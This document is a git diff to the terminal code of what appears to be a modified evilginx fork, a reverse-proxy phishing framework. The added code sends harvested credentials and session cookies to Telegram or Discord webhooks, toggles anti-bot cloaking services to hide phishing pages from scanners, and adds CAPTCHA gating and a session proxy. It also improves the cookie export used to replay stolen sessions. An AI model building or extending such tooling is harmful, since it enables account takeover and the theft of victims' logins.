@@ -8,7 +8,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"math/rand"
 	"net/url"
 	"os"
@@ -54,16 +53,6 @@ func NewTerminal(p *HttpProxy, cfg *Config, crt_db *CertDb, db *database.Databas
 
 	t.createHelp()
 	t.completer = t.hlp.GetPrefixCompleter(LAYER_TOP)
-	/*
-		t.completer = readline.NewPrefixCompleter(
-			readline.PcItem("server"),
-			readline.PcItem("ip"),
-			readline.PcItem("status"),
-			readline.PcItem("phishlet", readline.PcItem("show"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("hostname"), readline.PcItem("url")),
-			readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))),
-			readline.PcItem("exit"),
-		)
-	*/
 	t.rl, err = readline.NewEx(&readline.Config{
 		Prompt:              DEFAULT_PROMPT,
 		AutoComplete:        t.completer,
@@ -87,7 +76,7 @@ func (t *Terminal) output(s string, args ...interface{}) {
 }
 
 func (t *Terminal) DoWork() {
-	var do_quit = false
+	do_quit := false
 
 	t.checkStatus()
 	log.SetReadline(t.rl)
@@ -95,6 +84,13 @@ func (t *Terminal) DoWork() {
 	t.cfg.refreshActiveHostnames()
 	t.updatePhishletCertificates("")
 	t.updateLuresCertificates()
+
+	for i := 0; i <= 10; i++ {
+		if err := t.handleLures([]string{"get-url", fmt.Sprintf("%d", i)}); err != nil {
+			break
+		}
+
+	}
 
 	t.output("%s", t.sprintPhishletStatus(""))
 
@@ -124,7 +120,7 @@ func (t *Terminal) DoWork() {
 		switch args[0] {
 		case "clear":
 			cmd_ok = true
-			readline.ClearScreen(color.Output)
+			readline.ClearScreen(color.Output) //nolint:errcheck // linux/windows compatibility
 		case "config":
 			cmd_ok = true
 			err := t.handleConfig(args[1:])
@@ -161,6 +157,12 @@ func (t *Terminal) DoWork() {
 			if err != nil {
 				log.Error("blacklist: %v", err)
 			}
+		case "aversions":
+			cmd_ok = true
+			err := t.handleAversions(args[1:])
+			if err != nil {
+				log.Error("blacklist: %v", err)
+			}
 		case "help":
 			cmd_ok = true
 			if len(args) == 2 {
@@ -187,8 +189,8 @@ func (t *Terminal) DoWork() {
 func (t *Terminal) handleConfig(args []string) error {
 	pn := len(args)
 	if pn == 0 {
-		keys := []string{"domain", "ip", "redirect_key", "verification_key", "verification_token", "redirect_url"}
-		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl}
+		keys := []string{"domain", "ip", "redirect_key", "verification_key", "verification_token", "redirect_url", "webhook_verbosity", "webhook_telegram", "webhook_discord", "adminpage_path", "turnstile_sitekey", "turnstile_privkey", "recaptcha_sitekey", "recaptcha_privkey"}
+		vals := []string{t.cfg.baseDomain, t.cfg.serverIP, t.cfg.redirectParam, t.cfg.verificationParam, t.cfg.verificationToken, t.cfg.redirectUrl, strconv.Itoa(t.cfg.webhook_verbosity), t.cfg.webhook_telegram, t.cfg.webhook_discord, t.cfg.adminpage_path, t.cfg.turnstile_sitekey, t.cfg.turnstile_privkey, t.cfg.recaptcha_sitekey, t.cfg.recaptcha_privkey}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	} else if pn == 2 {
@@ -212,6 +214,21 @@ func (t *Terminal) handleConfig(args []string) error {
 			t.cfg.SetVerificationToken(args[1])
 			log.Warning("you need to regenerate your phishing urls after this change")
 			return nil
+		case "webhook_verbosity":
+			verbosity, err := strconv.Atoi(args[1])
+			if err != nil {
+				return err
+			}
+			t.cfg.SetWebhookVerbosity(verbosity)
+			return nil
+		case "webhook_discord":
+			t.cfg.SetWebhookDiscord(args[1])
+			log.Warning("you need to restart evilginx after this change")
+			return nil
+		case "webhook_telegram":
+			t.cfg.SetWebhookTelegram(args[1])
+			log.Warning("you need to restart evilginx after this change")
+			return nil
 		case "redirect_url":
 			if len(args[1]) > 0 {
 				_, err := url.ParseRequestURI(args[1])
@@ -221,7 +238,71 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 			t.cfg.SetRedirectUrl(args[1])
 			return nil
+		case "adminpage_path":
+			t.cfg.SetAdminpagePath(args[1])
+			return nil
+		case "turnstile_sitekey":
+			t.cfg.SetTurnstileSitekey(args[1])
+			return nil
+		case "turnstile_privkey":
+			t.cfg.SetTurnstilePrivkey(args[1])
+			return nil
+		case "recaptcha_sitekey":
+			t.cfg.SetReCaptchaSitekey(args[1])
+			return nil
+		case "recaptcha_privkey":
+			t.cfg.SetReCaptchaPrivkey(args[1])
+			return nil
 		}
+	}
+	return fmt.Errorf("invalid syntax: %s", args)
+}
+
+func (t *Terminal) handleAversions(args []string) error {
+	pn := len(args)
+	if pn == 0 {
+		var simplebot_enabled string = "no"
+		if t.cfg.simplebotEnabled {
+			simplebot_enabled = "yes"
+		}
+
+		var nkpbot_enabled string = "no"
+		if t.cfg.nkpbotEnabled {
+			nkpbot_enabled = "yes"
+		}
+
+		var killbot_enabled string = "no"
+		if t.cfg.killbotEnabled {
+			killbot_enabled = "yes"
+		}
+
+		var antibotpw_enabled string = "no"
+		if t.cfg.antibotpwEnabled {
+			antibotpw_enabled = "yes"
+		}
+
+		keys := []string{"simplebot", "nkpbot", "killbot", "killbot_key", "antibot", "antibotpw_key"}
+		vals := []string{simplebot_enabled, nkpbot_enabled, killbot_enabled, t.cfg.killbot_apikey, antibotpw_enabled, t.cfg.antibotpw_apikey}
+		log.Printf("\n%s\n", AsRows(keys, vals))
+		return nil
+	} else if pn == 2 {
+		switch args[0] {
+		case "simplebot":
+			t.cfg.ToggleSimpleBot()
+		case "nkpbot":
+			t.cfg.ToggleNkpBot()
+		case "killbot":
+			t.cfg.ToggleKillbot()
+		case "killbot_key":
+			t.cfg.SetKillBotApikey(args[1])
+		case "antibot":
+			t.cfg.ToggleAntibotPw()
+		case "antibotpw_apikey":
+			t.cfg.SetAntiBotPwApikey(args[1])
+		default:
+			log.Important("you need to restart evilginx for the changes to take effect!")
+		}
+		return nil
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
 }
@@ -250,17 +331,24 @@ func (t *Terminal) handleBlacklist(args []string) error {
 
 func (t *Terminal) handleProxy(args []string) error {
 	pn := len(args)
-	if pn == 0 {
+	switch {
+	case pn == 0:
 		var proxy_enabled string = "no"
 		if t.cfg.proxyEnabled {
 			proxy_enabled = "yes"
 		}
 
-		keys := []string{"enabled", "type", "address", "port", "username", "password"}
-		vals := []string{proxy_enabled, t.cfg.proxyType, t.cfg.proxyAddress, strconv.Itoa(t.cfg.proxyPort), t.cfg.proxyUsername, t.cfg.proxyPassword}
+		var proxy_session string = "no"
+		if t.cfg.proxySession {
+			proxy_session = "yes"
+		}
+
+		keys := []string{"enabled", "type", "address", "port", "username", "password", "session"}
+		vals := []string{proxy_enabled, t.cfg.proxyType, t.cfg.proxyAddress, strconv.Itoa(t.cfg.proxyPort), t.cfg.proxyUsername, t.cfg.proxyPassword, proxy_session}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
-	} else if pn == 1 {
+
+	case pn == 1:
 		switch args[0] {
 		case "enable":
 			err := t.p.setProxy(true, t.p.cfg.proxyType, t.p.cfg.proxyAddress, t.p.cfg.proxyPort, t.p.cfg.proxyUsername, t.p.cfg.proxyPassword)
@@ -277,8 +365,17 @@ func (t *Terminal) handleProxy(args []string) error {
 			}
 			t.cfg.EnableProxy(false)
 			return nil
+		case "session":
+			if t.cfg.proxySession {
+				t.cfg.proxySession = false
+				t.cfg.EnableSessionProxy(t.cfg.proxySession)
+				return nil
+			}
+			t.cfg.proxySession = true
+			t.cfg.EnableSessionProxy(t.cfg.proxySession)
+			return nil
 		}
-	} else if pn == 2 {
+	case pn == 2:
 		switch args[0] {
 		case "type":
 			if t.cfg.proxyEnabled {
@@ -328,7 +425,8 @@ func (t *Terminal) handleSessions(args []string) error {
 	cyan := color.New(color.FgCyan)
 
 	pn := len(args)
-	if pn == 0 {
+	switch {
+	case pn == 0:
 		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
 		sessions, err := t.db.ListSessions()
 		if err != nil {
@@ -349,7 +447,8 @@ func (t *Terminal) handleSessions(args []string) error {
 		}
 		log.Printf("\n%s\n", AsTable(cols, rows))
 		return nil
-	} else if pn == 1 {
+
+	case pn == 1:
 		id, err := strconv.Atoi(args[0])
 		if err != nil {
 			return err
@@ -364,46 +463,49 @@ func (t *Terminal) handleSessions(args []string) error {
 		}
 		s_found := false
 		for _, s := range sessions {
-			if s.Id == id {
-				pl, err := t.cfg.GetPhishlet(s.Phishlet)
-				if err != nil {
-					log.Error("%v", err)
-					break
-				}
+			if s.Id != id {
+				continue
+			}
 
-				s_found = true
-				tcol := dgray.Sprintf("empty")
-				if len(s.Tokens) > 0 {
-					tcol = lgreen.Sprintf("captured")
-				}
-
-				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
-				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
-				log.Printf("\n%s", AsRows(keys, vals))
-
-				if len(s.Custom) > 0 {
-					var ckeys []string = []string{"custom", "value"}
-					var cvals [][]string
-					for k, v := range s.Custom {
-						cvals = append(cvals, []string{dgray.Sprint(k), cyan.Sprint(v)})
-					}
-					log.Printf("\n%s", AsTable(ckeys, cvals))
-				}
-
-				if len(s.Tokens) > 0 {
-					json_tokens := t.tokensToJSON(pl, s.Tokens)
-					t.output("%s\n", json_tokens)
-				} else {
-					t.output("\n")
-				}
+			pl, err := t.cfg.GetPhishlet(s.Phishlet)
+			if err != nil {
+				log.Error("%v", err)
 				break
 			}
+
+			s_found = true
+			tcol := dgray.Sprintf("empty")
+			if len(s.Tokens) > 0 {
+				tcol = lgreen.Sprintf("captured")
+			}
+
+			keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
+			vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
+			log.Printf("\n%s", AsRows(keys, vals))
+
+			if len(s.Custom) > 0 {
+				var ckeys []string = []string{"custom", "value"}
+				var cvals [][]string
+				for k, v := range s.Custom {
+					cvals = append(cvals, []string{dgray.Sprint(k), cyan.Sprint(v)})
+				}
+				log.Printf("\n%s", AsTable(ckeys, cvals))
+			}
+
+			if len(s.Tokens) > 0 {
+				json_tokens := t.tokensToJSON(pl, s.Tokens)
+				t.output("%s\n", json_tokens)
+			} else {
+				t.output("\n")
+			}
+			break
 		}
 		if !s_found {
 			return fmt.Errorf("id %d not found", id)
 		}
 		return nil
-	} else if pn == 2 {
+
+	case pn == 2:
 		switch args[0] {
 		case "delete":
 			if args[1] == "all" {
@@ -422,7 +524,10 @@ func (t *Terminal) handleSessions(args []string) error {
 						log.Info("deleted session with ID: %d", s.Id)
 					}
 				}
-				t.db.Flush()
+				err = t.db.Flush()
+				if err != nil {
+					log.Warning("flush: %v", err)
+				}
 				return nil
 			} else {
 				rc := strings.Split(args[1], ",")
@@ -462,7 +567,10 @@ func (t *Terminal) handleSessions(args []string) error {
 						}
 					}
 				}
-				t.db.Flush()
+				err := t.db.Flush()
+				if err != nil {
+					log.Warning("flush: %v", err)
+				}
 				return nil
 			}
 		}
@@ -473,10 +581,12 @@ func (t *Terminal) handleSessions(args []string) error {
 func (t *Terminal) handlePhishlets(args []string) error {
 	pn := len(args)
 
-	if pn == 0 {
+	switch {
+	case pn == 0:
 		t.output("%s", t.sprintPhishletStatus(""))
 		return nil
-	} else if pn == 2 {
+
+	case pn == 2:
 		switch args[0] {
 		case "enable":
 			_, err := t.cfg.GetPhishlet(args[1])
@@ -520,7 +630,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				return err
 			}
 			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
-			if !ok || len(bhost) == 0 {
+			if !ok || bhost == "" {
 				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
 			}
 			out := ""
@@ -534,7 +644,8 @@ func (t *Terminal) handlePhishlets(args []string) error {
 			t.output("%s\n", out)
 			return nil
 		}
-	} else if pn == 3 {
+
+	case pn == 3:
 		switch args[0] {
 		case "hostname":
 			_, err := t.cfg.GetPhishlet(args[1])
@@ -542,7 +653,10 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				return err
 			}
 			if ok := t.cfg.SetSiteHostname(args[1], args[2]); ok {
-				t.cfg.SetSiteDisabled(args[1])
+				err := t.cfg.SetSiteDisabled(args[1])
+				if err != nil {
+					return err
+				}
 			}
 			return nil
 		case "get-url":
@@ -551,7 +665,7 @@ func (t *Terminal) handlePhishlets(args []string) error {
 				return err
 			}
 			bhost, ok := t.cfg.GetSiteDomain(pl.Site)
-			if !ok || len(bhost) == 0 {
+			if !ok || bhost == "" {
 				return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
 			}
 			urls, err := pl.GetLandingUrls(args[2], true)
@@ -580,7 +694,6 @@ func (t *Terminal) handleLures(args []string) error {
 	hiblue := color.New(color.FgHiBlue)
 	yellow := color.New(color.FgYellow)
 	green := color.New(color.FgGreen)
-	//hiwhite := color.New(color.FgHiWhite)
 	hcyan := color.New(color.FgHiCyan)
 	cyan := color.New(color.FgCyan)
 	dgray := color.New(color.FgHiBlack)
@@ -625,7 +738,7 @@ func (t *Terminal) handleLures(args []string) error {
 					return fmt.Errorf("get-url: %v", err)
 				}
 				bhost, ok := t.cfg.GetSiteDomain(pl.Site)
-				if !ok || len(bhost) == 0 {
+				if !ok || bhost == "" {
 					return fmt.Errorf("no hostname set for phishlet '%s'", pl.Name)
 				}
 
@@ -772,7 +885,7 @@ func (t *Terminal) handleLures(args []string) error {
 							return fmt.Errorf("edit: %v", err)
 						}
 						l.Path = u.EscapedPath()
-						if len(l.Path) == 0 || l.Path[0] != '/' {
+						if l.Path == "" || l.Path[0] != '/' {
 							l.Path = "/" + l.Path
 						}
 					} else {
@@ -893,7 +1006,7 @@ func (t *Terminal) handleLures(args []string) error {
 				}
 				if args[1] == "all" {
 					di := []int{}
-					for n, _ := range t.cfg.lures {
+					for n := range t.cfg.lures {
 						di = append(di, n)
 					}
 					if len(di) > 0 {
@@ -963,7 +1076,7 @@ func (t *Terminal) handleLures(args []string) error {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ip"), readline.PcItem("redirect_key"), readline.PcItem("verification_key"), readline.PcItem("verification_token"), readline.PcItem("redirect_url")))
+		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ip"), readline.PcItem("redirect_key"), readline.PcItem("verification_key"), readline.PcItem("verification_token"), readline.PcItem("redirect_url"), readline.PcItem("webhook_verbosity"), readline.PcItem("webhook_telegram"), readline.PcItem("adminpage_path")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ip"}, "ip <ip_address>", "set ip address of the current server")
@@ -971,17 +1084,36 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"verification_key"}, "verification_key <name>", "change name of the verification parameter in phishing url (phishing urls will need to be regenerated)")
 	h.AddSubCommand("config", []string{"verification_token"}, "verification_token <token>", "change the value of the verification token (phishing urls will need to be regenerated)")
 	h.AddSubCommand("config", []string{"redirect_url"}, "redirect_url <url>", "change the url where all unauthorized requests will be redirected to (phishing urls will need to be regenerated)")
+	h.AddSubCommand("config", []string{"webhook_verbosity"}, "webhook_verbosity <level>", "control what triggers webhook (0 - disabled, 1 - valid credentials and cookie sent only on final auth, 2 - all submitted data sent)")
+	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "telegram webhook config in format: bot_token/chat_id (example: 4101656209:AAFJeahG73axTthuvh4wW4gg6Wtnhe51yVw/1721242916)")
+	// h.AddSubCommand("config", []string{"webhook_discord"}, "webhook_discord <id>/<token>", "discord webhook token in format: id/token (example: 8925722107289755319/wsNqBlamQDsIEzS1dCv02HpqfxTV2NltrV4tFOlaUcVQ1fb4P6KmAhDMFAh4vMpi7xIX)")
+	h.AddSubCommand("config", []string{"adminpage_path"}, "adminpage_path", "change the path of which you access the admin page")
+	h.AddSubCommand("config", []string{"turnstile_sitekey"}, "turnstile_sitekey", "change the site key for Cloudflare's Turnstile CAPTCHA")
+	h.AddSubCommand("config", []string{"turnstile_privkey"}, "turnstile_privkey", "change the private key for Cloudflare's Turnstile CAPTCHA")
+	h.AddSubCommand("config", []string{"recaptcha_sitekey"}, "recaptcha_sitekey", "change the site key for Google's reCAPTCHA")
+	h.AddSubCommand("config", []string{"recaptcha_privkey"}, "recaptcha_privkey", "change the private key for Google's reCAPTCHA")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
 	h.AddSubCommand("proxy", nil, "", "show all configuration variables")
 	h.AddSubCommand("proxy", []string{"enable"}, "enable", "enable proxy")
+	h.AddSubCommand("proxy", []string{"session"}, "session", "enables session proxy")
 	h.AddSubCommand("proxy", []string{"disable"}, "disable", "disable proxy")
 	h.AddSubCommand("proxy", []string{"type"}, "type <type>", "set proxy type: http (default), https, socks5, socks5h")
 	h.AddSubCommand("proxy", []string{"address"}, "address <address>", "set proxy address")
 	h.AddSubCommand("proxy", []string{"port"}, "port <port>", "set proxy port")
 	h.AddSubCommand("proxy", []string{"username"}, "username <username>", "set proxy authentication username")
 	h.AddSubCommand("proxy", []string{"password"}, "password <password>", "set proxy authentication password")
+
+	h.AddCommand("aversions", "general", "manage aversions configurations'", "Configures aversions to help block bots from reaching your site by redirecting bad IPs", LAYER_TOP,
+		readline.PcItem("aversions", readline.PcItem("simplebot"), readline.PcItem("nkpbot"), readline.PcItem("killbot"), readline.PcItem("killbot_key"), readline.PcItem("antibotpw"), readline.PcItem("antibotpw_key")))
+	h.AddSubCommand("aversions", nil, "", "show all aversion settings")
+	h.AddSubCommand("aversions", []string{"simplebot"}, "", "toggle simplebot on/off")
+	h.AddSubCommand("aversions", []string{"nkpbot"}, "", "toggle nkpbot on/off")
+	h.AddSubCommand("aversions", []string{"killbot"}, "", "toggle killbot on/off")
+	h.AddSubCommand("aversions", []string{"killbot_key"}, "killbot_key <api_key>", "set api key for killbot.org antibot service")
+	h.AddSubCommand("aversions", []string{"antibotpw"}, "", "toggle antibotpw on/off")
+	h.AddSubCommand("aversions", []string{"antibotpw_key"}, "antibotpw_key <antibot_key>", "set api key for antibot.pw antibot service")
 
 	h.AddCommand("phishlets", "general", "manage phishlets configuration", "Shows status of all available phishlets and allows to change their parameters and enabled status.", LAYER_TOP,
 		readline.PcItem("phishlets", readline.PcItem("hostname", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("enable", readline.PcItemDynamic(t.phishletPrefixCompleter)),
@@ -1051,8 +1183,10 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*data
 		ExpirationDate int64  `json:"expirationDate"`
 		Value          string `json:"value"`
 		Name           string `json:"name"`
-		HttpOnly       bool   `json:"httpOnly,omitempty"`
-		HostOnly       bool   `json:"hostOnly,omitempty"`
+		HttpOnly       bool   `json:"httpOnly"`
+		HostOnly       bool   `json:"hostOnly"`
+		Secure         bool   `json:"secure"`
+		SameSite       string `json:"sameSite"`
 	}
 
 	var cookies []*Cookie
@@ -1065,7 +1199,19 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*data
 				Value:          v.Value,
 				Name:           k,
 				HttpOnly:       v.HttpOnly,
+				Secure:         v.Secure,
 			}
+			// Convert int representation of SameSite to string representation
+			c.SameSite = "unspecified"
+			switch v.SameSite {
+			case 2:
+				c.SameSite = "lax"
+			case 3:
+				c.SameSite = "strict"
+			case 4:
+				c.SameSite = "no_restriction"
+			}
+
 			if domain[:1] == "." {
 				c.HostOnly = false
 				c.Domain = domain[1:]
@@ -1079,8 +1225,11 @@ func (t *Terminal) tokensToJSON(pl *Phishlet, tokens map[string]map[string]*data
 		}
 	}
 
-	json, _ := json.Marshal(cookies)
-	return string(json)
+	results, err := json.Marshal(cookies)
+	if err != nil {
+		log.Error("%v", err)
+	}
+	return string(results)
 }
 
 func (t *Terminal) checkStatus() {
@@ -1107,9 +1256,12 @@ func (t *Terminal) updatePhishletCertificates(site string) {
 				err = t.crt_db.SetupPhishletCertificate(s, pl.GetPhishHosts())
 				if err != nil {
 					log.Fatal("%v", err)
-					t.cfg.SetSiteDisabled(s)
+					err = t.cfg.SetSiteDisabled(s)
+					if err != nil {
+						log.Error("disabling: %s resulted in error: %s", s, err)
+					}
 				} else {
-					log.Success("successfully set up SSL/TLS certificates for domains: %v", pl.GetPhishHosts())
+					log.Success("successfully set up SSL/TLS certificates for %v domains", len(pl.GetPhishHosts()))
 				}
 			}
 		}
@@ -1133,7 +1285,6 @@ func (t *Terminal) updateLuresCertificates() {
 }
 
 func (t *Terminal) updateHostCertificate(hostname string) error {
-
 	if t.developer {
 		log.Info("developer mode is on - will use self-signed SSL/TLS certificates for hostname '%s'", hostname)
 	} else {
@@ -1157,26 +1308,27 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 	n := 0
 	cols := []string{"phishlet", "author", "active", "status", "hostname"}
 	var rows [][]string
-	for s, _ := range t.cfg.phishlets {
-		if site == "" || s == site {
-			pl, err := t.cfg.GetPhishlet(s)
-			if err != nil {
-				continue
-			}
-
-			status := hired.Sprint("disabled")
-			if t.cfg.IsSiteEnabled(s) {
-				status = higreen.Sprint("enabled")
-			}
-			hidden_status := higreen.Sprint("available")
-			if t.cfg.IsSiteHidden(s) {
-				hidden_status = hired.Sprint("hidden")
-			}
-			domain, _ := t.cfg.GetSiteDomain(s)
-			n += 1
-
-			rows = append(rows, []string{hiblue.Sprint(s), hiwhite.Sprint(pl.Author), status, hidden_status, yellow.Sprint(domain)})
+	for s := range t.cfg.phishlets {
+		if !(site == "" || s == site) {
+			continue
 		}
+		pl, err := t.cfg.GetPhishlet(s)
+		if err != nil {
+			continue
+		}
+
+		status := hired.Sprint("disabled")
+		if t.cfg.IsSiteEnabled(s) {
+			status = higreen.Sprint("enabled")
+		}
+		hidden_status := higreen.Sprint("available")
+		if t.cfg.IsSiteHidden(s) {
+			hidden_status = hired.Sprint("hidden")
+		}
+		domain, _ := t.cfg.GetSiteDomain(s)
+		n += 1
+
+		rows = append(rows, []string{hiblue.Sprint(s), hiwhite.Sprint(pl.Author), status, hidden_status, yellow.Sprint(domain)})
 	}
 	return AsTable(cols, rows)
 }
@@ -1184,13 +1336,11 @@ func (t *Terminal) sprintPhishletStatus(site string) string {
 func (t *Terminal) sprintLures() string {
 	higreen := color.New(color.FgHiGreen)
 	green := color.New(color.FgGreen)
-	//hired := color.New(color.FgHiRed)
 	hiblue := color.New(color.FgHiBlue)
 	yellow := color.New(color.FgYellow)
 	cyan := color.New(color.FgCyan)
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
-	//n := 0
 	cols := []string{"id", "phishlet", "hostname", "path", "template", "ua_filter", "redirect_url", "og"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
@@ -1227,7 +1377,7 @@ func (t *Terminal) phishletPrefixCompleter(args string) []string {
 func (t *Terminal) templatesPrefixCompleter(args string) []string {
 	dir := t.cfg.GetTemplatesDir()
 
-	files, err := ioutil.ReadDir(dir)
+	files, err := os.ReadDir(dir)
 	if err != nil {
 		return []string{}
 	}
@@ -1246,17 +1396,14 @@ func (t *Terminal) templatesPrefixCompleter(args string) []string {
 
 func (t *Terminal) luresIdPrefixCompleter(args string) []string {
 	var ret []string
-	for n, _ := range t.cfg.lures {
+	for n := range t.cfg.lures {
 		ret = append(ret, strconv.Itoa(n))
 	}
 	return ret
 }
 
-func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
-	var ret []string
-	var ret_params []map[string]string
-
-	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
+func (t *Terminal) importParamsFromFile(base_url, path string) (ret []string, ret_params []map[string]string, err error) {
+	f, err := os.OpenFile(path, os.O_RDONLY, 0o644)
 	if err != nil {
 		return ret, ret_params, err
 	}
@@ -1344,7 +1491,7 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 			return ret, ret_params, err
 		}
 	case "json":
-		data, err := ioutil.ReadAll(bufio.NewReader(f))
+		data, err := io.ReadAll(bufio.NewReader(f))
 		if err != nil {
 			return ret, ret_params, err
 		}
@@ -1372,35 +1519,6 @@ func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string,
 				ret_params = append(ret_params, map_params)
 			}
 		}
-
-		/*
-			r := json.NewDecoder(bufio.NewReader(f))
-
-			t, err := r.Token()
-			if err != nil {
-				return ret, ret_params, err
-			}
-			if s, ok := t.(string); ok && s == "[" {
-				for r.More() {
-					t, err := r.Token()
-					if err != nil {
-						return ret, ret_params, err
-					}
-
-					if s, ok := t.(string); ok && s == "{" {
-						for r.More() {
-							t, err := r.Token()
-							if err != nil {
-								return ret, ret_params, err
-							}
-
-
-						}
-					}
-				}
-			} else {
-				return ret, ret_params, fmt.Errorf("array of parameters not found")
-			}*/
 	}
 	return ret, ret_params, nil
 }
@@ -1413,13 +1531,14 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 		return fmt.Errorf("export format can only be 'text', 'csv' or 'json'")
 	}
 
-	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
+	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o644)
 	if err != nil {
 		return err
 	}
 	defer f.Close()
 
-	if format == "text" {
+	switch {
+	case format == "text":
 		for n, phish_url := range phish_urls {
 			var params string
 			m := 0
@@ -1437,7 +1556,8 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 				return err
 			}
 		}
-	} else if format == "csv" {
+
+	case format == "csv":
 		var data [][]string
 
 		w := csv.NewWriter(bufio.NewWriter(f))
@@ -1446,7 +1566,7 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 		var param_names []string
 		cols = append(cols, "url")
 		for _, params_row := range phish_params {
-			for k, _ := range params_row {
+			for k := range params_row {
 				if !stringExists(k, param_names) {
 					cols = append(cols, k)
 					param_names = append(param_names, k)
@@ -1472,7 +1592,8 @@ func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phis
 		if err != nil {
 			return err
 		}
-	} else if format == "json" {
+
+	case format == "json":
 		type UrlItem struct {
 			PhishUrl string            `json:"url"`
 			Params   map[string]string `json:"params"`
@@ -1529,15 +1650,9 @@ func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
 	return ret
 }
 
-func (t *Terminal) sprintVar(k string, v string) string {
-	vc := color.New(color.FgYellow)
-	return k + ": " + vc.Sprint(v)
-}
-
 func (t *Terminal) filterInput(r rune) (rune, bool) {
-	switch r {
 	// block CtrlZ feature
-	case readline.CharCtrlZ:
+	if r == readline.CharCtrlZ {
 		return r, false
 	}
 	return r, true
